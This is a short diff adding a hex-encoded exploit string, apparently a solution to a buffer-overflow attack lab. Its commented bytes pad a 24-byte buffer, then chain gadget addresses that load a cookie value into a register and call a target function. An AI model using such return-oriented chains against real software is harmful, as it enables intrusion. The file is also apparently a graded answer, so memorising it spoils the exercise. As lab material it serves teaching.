@@ -1,0 +1,10 @@
+/* Pad with 24 bytes */
+ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* Pop to rax */
+ 68 1d 40 00 00 00 00 00
+/* Stack data = 0x754e7ddd */
+ dd 7d 4e 75 00 00 00 00
+/* Move from rax to rdi */
+ 48 1d 40 00 00 00 00 00
+/* Call target function */
+ 90 1b 40 00 00 00 00 00
